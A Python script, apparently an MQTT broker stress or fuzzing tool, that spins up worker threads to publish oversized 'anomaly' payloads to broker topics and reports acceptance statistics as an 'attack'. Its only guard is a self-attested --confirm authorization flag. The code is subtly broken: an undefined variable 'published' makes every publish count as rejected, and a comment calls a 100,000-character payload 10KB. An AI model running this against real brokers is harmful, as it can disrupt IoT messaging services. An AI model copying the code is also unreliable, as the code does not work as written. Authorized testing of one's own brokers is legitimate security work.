#!/usr/bin/env python3
"""
How to run:
  python payload_anomaly1883.py --broker localhost --port 1883 --workers 4 --delay 500 --qos 1 --confirm
"""

import argparse
import json
import logging
import random
import string
import sys
import threading
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

DEFAULT_BROKER = "localhost"
DEFAULT_PORT = 1883
DEFAULT_WORKERS = 2
DEFAULT_DELAY_MS = 1000
DEFAULT_QOS = 1  # use QoS 1 to get broker acknowledgement

class PayloadAnomalyAttack:
    def __init__(self, broker_host=DEFAULT_BROKER, broker_port=DEFAULT_PORT,
                 qos=DEFAULT_QOS):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.qos = qos

        # statistics (thread-safe)
        self.attack_stats = {
            "anomalies_sent": 0,
            "anomalies_accepted": 0,
            "anomalies_rejected": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }
        self.stats_lock = threading.Lock()

        # control
        self.stop_event = threading.Event()

        # Logging
        self.logger = logging.getLogger("PayloadAnomalyAttack")

    def _rand_suffix(self, n=8):
        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

    def create_client(self, client_id_prefix):
        """
        Create paho MQTT client in a broadly compatible way (MQTT v3.1.1).
        TLS/auth removed per request.
        """
        client_id = f"{client_id_prefix}_{int(time.time()*1000)}_{self._rand_suffix(6)}"
        try:
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)

            # callbacks - keep simple and safe
            client.on_connect = lambda c, u, f, rc: self.logger.debug("%s connected rc=%s", client_id, rc)
            client.on_disconnect = lambda c, u, rc: self.logger.debug("%s disconnected rc=%s", client_id, rc)
            client.on_publish = lambda c, u, mid: self.logger.debug("%s published mid=%s", client_id, mid)

            return client
        except Exception as e:
            self.logger.exception("Failed to create client %s: %s", client_id, e)
            return None

    def generate_anomaly_payloads(self):
        """
        Generate a list of anomaly dicts: {type, payload, description}
        Keep payloads as bytes or strings to be accepted by paho publish.
        """
        anomalies = []

        anomalies.append({
            "type": "oversized",
            "payload": "A" * 10_0000,
            "description": "Oversized payload (10KB)"
        })


        return anomalies

    def anomaly_worker(self, worker_id, anomalies, topics, delay_ms=1000):
        """
        Worker connects and publishes each anomaly once to a random topic.
        Uses QoS self.qos and wait_for_publish() to provide stronger confirmation.
        """
        client = self.create_client(client_id_prefix=f"anomaly_attacker_{worker_id}")
        if client is None:
            with self.stats_lock:
                self.attack_stats["connections_failed"] += 1
            self.logger.error("Worker %s: client creation failed", worker_id)
            return

        try:
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            self.logger.info("Worker %s: Connected to %s:%s", worker_id, self.broker_host, self.broker_port)

            for anomaly in anomalies:
                if self.stop_event.is_set():
                    self.logger.info("Worker %s: stop requested, exiting", worker_id)
                    break

                topic = random.choice(topics)
                payload = anomaly["payload"]

                try:
                    # Publish with configured QoS and wait for confirmation.
                    info = client.publish(topic, payload, qos=self.qos)
                    # Mark as "sent" as soon as publish() returns a MessageInfo (local queueing)
                    with self.stats_lock:
                        self.attack_stats["anomalies_sent"] += 1

                    if published:
                        with self.stats_lock:
                            self.attack_stats["anomalies_accepted"] += 1
                        self.logger.info("Worker %s: Anomaly accepted: %s -> %s", worker_id, anomaly["type"], topic)
                    else:
                        with self.stats_lock:
                            self.attack_stats["anomalies_rejected"] += 1
                        self.logger.warning("Worker %s: No confirmation for %s -> %s (timeout)", worker_id, anomaly["type"], topic)

                except Exception as e:
                    with self.stats_lock:
                        self.attack_stats["anomalies_rejected"] += 1
                    self.logger.exception("Worker %s: Error publishing %s: %s", worker_id, anomaly["type"], e)

                # Delay between anomalies (allow interruptible sleep)
                for _ in range(int(delay_ms / 100)):
                    if self.stop_event.is_set():
                        break
                    time.sleep(0.1)

            self.logger.info("Worker %s: completed", worker_id)

        except Exception as e:
            with self.stats_lock:
                self.attack_stats["connections_failed"] += 1
            self.logger.exception("Worker %s: Connection error: %s", worker_id, e)
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except Exception:
                pass

    def launch_attack(self, num_workers=DEFAULT_WORKERS, delay_ms=DEFAULT_DELAY_MS, topics=None):
        if topics is None or len(topics) == 0:
            topics = [
                "security/test/payload"
            ]

        anomalies = self.generate_anomaly_payloads()

        self.logger.info("Starting Payload Anomaly Attack")
        self.logger.info("  Workers: %s", num_workers)
        self.logger.info("  Anomaly types: %s", len(anomalies))
        self.logger.info("  Delay: %s ms", delay_ms)
        self.logger.info("  Topics: %s", len(topics))

        self.attack_stats["start_time"] = time.time()
        threads = []
        for i in range(num_workers):
            thread = threading.Thread(target=self.anomaly_worker, args=(i, anomalies, topics, delay_ms), daemon=True)
            threads.append(thread)

        for thread in threads:
            thread.start()

        try:
            # join threads; allow KeyboardInterrupt to set stop_event
            for thread in threads:
                while thread.is_alive():
                    thread.join(timeout=0.5)
                    if self.stop_event.is_set():
                        break
        except KeyboardInterrupt:
            self.logger.info("Launch: KeyboardInterrupt received, signaling workers to stop")
            self.stop_event.set()
            for thread in threads:
                thread.join(timeout=2.0)

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):
        duration = max(1e-6, (self.attack_stats["end_time"] - self.attack_stats["start_time"]))
        sent = self.attack_stats["anomalies_sent"]
        accepted = self.attack_stats["anomalies_accepted"]
        rejected = self.attack_stats["anomalies_rejected"]
        failed = self.attack_stats["connections_failed"]

        print("\nAttack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Anomalies sent: {sent}")
        print(f"Anomalies accepted: {accepted}")
        print(f"Anomalies rejected: {rejected}")
        print(f"Connections failed: {failed}")

        if sent > 0:
            acceptance_rate = accepted / sent * 100.0
            print(f"Anomaly acceptance rate: {acceptance_rate:.1f}%")
            print(f"Anomalies per second: {sent / duration:.1f}")

# ------------------ CLI ------------------
def parse_args():
    parser = argparse.ArgumentParser(description="MQTT Payload Anomaly Attack (patched, auth/TLS removed)")
    parser.add_argument("--broker", default=DEFAULT_BROKER, help="MQTT broker host")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="MQTT broker port")
    parser.add_argument("--workers", type=int, default=DEFAULT_WORKERS, help="Number of worker threads")
    parser.add_argument("--delay", type=int, default=DEFAULT_DELAY_MS, help="Delay between anomalies (ms)")
    parser.add_argument("--topics", nargs="+", help="Custom target topics")
    parser.add_argument("--qos", type=int, default=DEFAULT_QOS, choices=[0,1,2], help="MQTT QoS to use")
    parser.add_argument("--log-level", default="INFO", choices=["DEBUG","INFO","WARNING","ERROR","CRITICAL"], help="Logging level")
    # safety: require explicit consent before running against a real broker
    parser.add_argument("--confirm", action="store_true", help="Confirm you have authorization to run tests against the target broker")
    return parser.parse_args()

def main():
    args = parse_args()
    logging.basicConfig(level=getattr(logging, args.log_level), format="%(asctime)s [%(levelname)s] %(message)s")

    if not args.confirm:
        print("WARNING: This tool will publish malformed/malicious payloads to the target MQTT broker.")
        print("You MUST have authorization to run this against the target. Re-run with --confirm to proceed.")
        sys.exit(1)

    attack = PayloadAnomalyAttack(
        broker_host=args.broker,
        broker_port=args.port,
        qos=args.qos
    )

    try:
        attack.launch_attack(num_workers=args.workers, delay_ms=args.delay, topics=args.topics)
    except Exception as e:
        logging.exception("Fatal error running attack: %s", e)
        sys.exit(2)

if __name__ == "__main__":
    main()
